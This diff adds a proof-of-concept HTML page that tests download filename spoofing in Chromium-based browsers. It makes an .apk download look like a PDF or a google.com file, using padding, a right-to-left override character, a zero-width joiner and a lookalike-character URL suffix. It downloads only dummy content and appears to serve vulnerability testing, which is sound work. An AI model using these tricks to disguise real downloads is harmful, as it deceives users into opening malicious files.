@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Smart Download Filename Spoofing PoC</title>
+<style>
+  body { font-family: sans-serif; margin: 30px; }
+  h2 { color: #333; }
+  button { padding: 10px 20px; margin: 8px; border: none; border-radius: 6px; background: #007bff; color: white; cursor: pointer; }
+  button:hover { background: #0056b3; }
+  .note { font-size: 13px; color: #555; margin-top: 20px; }
+</style>
+<script>
+function triggerDownload(options) {
+  const {
+    base = "backup",
+    ext = ".apk",
+    padLength = 60,
+    padChar = "_",
+    spoofSuffix = "From https∶⧸⧸google.com",
+    useRLO = false,
+    useZWJ = false
+  } = options;
+
+  let filename = base;
+
+  // Tambahkan padding
+  filename += padChar.repeat(padLength);
+
+  // Jika RLO dipakai → membalik teks setelahnya
+  if (useRLO) {
+    filename += "\u202E" + "fdp."; // akan tampil seolah ".pdf"
+  } else {
+    filename += ext;
+  }
+
+  // Sisipkan ZWJ agar rendering tricky
+  if (useZWJ) {
+    filename += "\u200D";
+  }
+
+  filename += spoofSuffix;
+
+  const content = "Dummy content for spoof testing.";
+  const blob = new Blob([content], { type: "application/pdf" });
+  const url = URL.createObjectURL(blob);
+
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  URL.revokeObjectURL(url);
+
+  alert("Triggered download: " + filename);
+}
+</script>
+</head>
+<body>
+  <h2>Smart Download Filename Spoofing PoC</h2>
+  <p>Klik tombol di bawah untuk menguji berbagai teknik filename spoofing.</p>
+
+  <button onclick="triggerDownload({})">
+    Basic Spoof (.apk + long suffix)
+  </button>
+
+  <button onclick="triggerDownload({useRLO:true})">
+    RLO Spoof (.apk → terlihat .pdf)
+  </button>
+
+  <button onclick="triggerDownload({useZWJ:true})">
+    ZWJ Spoof (zero-width joiner)
+  </button>
+
+  <button onclick="triggerDownload({padLength:120, padChar:'·'})">
+    Long padding (truncation test)
+  </button>
+
+  <div class="note">
+    ⚠️ Catatan: Hasil spoofing dapat berbeda antar versi <b>Chrome/Chromium/Edge</b>.  
+    Perhatikan apakah <b>Save As dialog</b> dan <b>UI shelf</b> menampilkan nama file berbeda dari ekstensi sebenarnya.
+  </div>
+</body>
+</html>
